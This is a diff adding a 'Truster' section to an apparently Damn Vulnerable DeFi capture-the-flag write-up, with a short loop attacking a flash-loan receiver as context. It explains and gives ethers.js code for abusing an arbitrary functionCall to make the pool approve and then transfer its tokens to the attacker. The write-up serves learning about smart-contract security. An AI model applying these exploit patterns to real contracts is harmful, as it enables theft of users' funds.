@@ -13,4 +13,15 @@ We can call `flashloan()` from any address, so we just need to create a contract
 
 ` function attack(address victim) public { for (int256 i = 0; i < 10; i++) { pool.flashLoan(victim, 1); } `
 
+## 3) Truster
 
+The `flashloan()` function in TrusterLenderPool contract has a line that allow us to call a method from any contract with any variable we want: `target.functionCall(data);`
+So we simply create a contract that will call this method and use the `approve()` from ERC20 to approve the DVToken: 
+```
+const abi = ["function approve(address spender, uint256 amount)"];
+const interface = new ethers.utils.Interface(abi);
+const data = interface.encodeFunctionData("approve", [attackContract.address, TOKENS_IN_POOL]);
+
+await attackContract.attack(0, attacker.address, this.token.address, data);
+```
+Our attack contract will call this custom function and then simply transfer the token to our account.
